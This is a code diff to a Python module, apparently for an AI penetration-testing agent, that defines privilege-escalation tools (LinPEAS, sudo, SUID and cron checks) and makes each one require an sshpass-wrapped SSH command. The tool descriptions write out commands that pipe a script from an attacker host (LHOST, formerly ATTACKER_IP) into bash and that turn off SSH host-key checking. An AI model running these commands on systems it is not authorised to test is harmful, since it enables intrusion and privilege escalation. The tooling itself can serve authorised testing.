@@ -1,13 +1,20 @@
 from backend.tools.base import tool, run_command
 
+_SSHPASS_HINT = (
+    "[ERROR] No command provided. These tools run on YOUR machine, not the target. "
+    "You MUST wrap the command with sshpass to run remotely:\n"
+    "  sshpass -p 'PASSWORD' ssh -o StrictHostKeyChecking=no USER@TARGET 'COMMAND'\n"
+    "Check the attack graph for discovered credentials."
+)
+
 
 @tool(
     name='run_linpeas',
-    description='Run LinPEAS privilege escalation enumeration script on the target.',
+    description='Run LinPEAS privilege escalation enumeration on the target. IMPORTANT: Command must use sshpass to run remotely, e.g.: sshpass -p \'PASS\' ssh -o StrictHostKeyChecking=no user@target \'curl http://LHOST/linpeas.sh | bash\'',
     parameters={
         'type': 'object',
         'properties': {
-            'command': {'type': 'string', 'description': 'Command to download and run linpeas (e.g. "curl http://ATTACKER_IP/linpeas.sh | bash")'},
+            'command': {'type': 'string', 'description': 'Full SSH command to download and run linpeas on target'},
         },
         'required': ['command'],
     },
@@ -19,47 +26,53 @@ async def run_linpeas(command: str) -> str:
 
 @tool(
     name='check_sudo',
-    description='Check sudo privileges on the target.',
+    description='Check sudo privileges on the target. IMPORTANT: Command must use sshpass to run remotely, e.g.: sshpass -p \'PASS\' ssh -o StrictHostKeyChecking=no user@target \'sudo -l\'',
     parameters={
         'type': 'object',
         'properties': {
-            'command': {'type': 'string', 'description': 'Command to check sudo (e.g. "sudo -l")', 'default': 'sudo -l'},
+            'command': {'type': 'string', 'description': 'Full SSH command to check sudo on target'},
         },
-        'required': [],
+        'required': ['command'],
     },
     phases=['privesc'],
 )
-async def check_sudo(command: str = 'sudo -l') -> str:
+async def check_sudo(command: str = '') -> str:
+    if not command:
+        return _SSHPASS_HINT
     return await run_command(command)
 
 
 @tool(
     name='check_suid',
-    description='Find SUID binaries on the target.',
+    description='Find SUID binaries on the target. IMPORTANT: Command must use sshpass to run remotely, e.g.: sshpass -p \'PASS\' ssh -o StrictHostKeyChecking=no user@target \'find / -perm -4000 -type f 2>/dev/null\'',
     parameters={
         'type': 'object',
         'properties': {
-            'command': {'type': 'string', 'description': 'Command to find SUID binaries', 'default': 'find / -perm -4000 -type f 2>/dev/null'},
+            'command': {'type': 'string', 'description': 'Full SSH command to find SUID binaries on target'},
         },
-        'required': [],
+        'required': ['command'],
     },
     phases=['privesc'],
 )
-async def check_suid(command: str = 'find / -perm -4000 -type f 2>/dev/null') -> str:
+async def check_suid(command: str = '') -> str:
+    if not command:
+        return _SSHPASS_HINT
     return await run_command(command)
 
 
 @tool(
     name='check_cron',
-    description='Check for cron jobs that may be exploitable.',
+    description='Check for exploitable cron jobs on the target. IMPORTANT: Command must use sshpass to run remotely, e.g.: sshpass -p \'PASS\' ssh -o StrictHostKeyChecking=no user@target \'cat /etc/crontab; ls -la /etc/cron.d/\'',
     parameters={
         'type': 'object',
         'properties': {
-            'command': {'type': 'string', 'description': 'Command to check cron', 'default': 'cat /etc/crontab; ls -la /etc/cron.d/ 2>/dev/null; crontab -l 2>/dev/null'},
+            'command': {'type': 'string', 'description': 'Full SSH command to check cron on target'},
         },
-        'required': [],
+        'required': ['command'],
     },
     phases=['privesc'],
 )
-async def check_cron(command: str = 'cat /etc/crontab; ls -la /etc/cron.d/ 2>/dev/null; crontab -l 2>/dev/null') -> str:
+async def check_cron(command: str = '') -> str:
+    if not command:
+        return _SSHPASS_HINT
     return await run_command(command)
